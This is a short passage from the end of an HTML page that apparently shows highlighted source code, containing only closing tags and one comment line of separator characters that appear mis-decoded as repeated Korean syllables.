</span><span class="sc1">; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">

</span></div></body>
</html>
